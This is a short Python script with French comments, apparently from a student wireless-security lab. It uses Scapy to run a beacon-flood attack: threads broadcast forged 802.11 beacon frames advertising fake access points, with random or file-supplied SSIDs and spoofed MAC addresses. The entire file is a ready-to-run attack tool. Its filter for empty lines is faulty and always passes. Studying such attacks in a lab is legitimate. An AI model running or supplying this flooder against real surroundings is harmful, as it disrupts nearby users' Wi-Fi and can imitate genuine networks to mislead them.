# Source: https://www.thepythoncode.com/article/create-fake-access-points-scapy
# 
# Auteurs : Benoit Julien et Sutcu Volkan
# But: Inonder la salle de faux access points avec des SSID aléatoires ou via une liste de SSID contenue dans un fichier fourni au script comme suit : script3_floodAttack.py fichier.txt
# Date : 09.03.2020

from scapy.all import *
from threading import Thread
from faker import Faker
import sys

# Fonction permettant d'envoyer des paquets permettant de créer des access points avec un SSID et une fausse adresse mac
def send_beacon(ssid, mac, infinite=True):
    packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) 
    sendp(packet, inter=0.1, loop=1, iface="wlan0mon", verbose=0)

ssid = []

# Les SSID sont fournis soit dans un fichier soit construits aléatoirement
if not len(sys.argv) > 1:
    for i in range(5):
        ssid.append(Faker().name())
else:
    file = open(sys.argv[1], "r")
    for line in file:
        # Evite de prendre des SSID avec un nom vide
        if line != "" or line != "\n" or line != "\r\n":
            ssid.append(line.rstrip())

# Chaque access point est un thread démarré et qui va envoyer des paquets contenant le SSID et la mac address aléatoire
for ssid_name in ssid:
    print(ssid_name)
    Thread(target=send_beacon, args=(ssid_name, Faker().mac_address())).start()
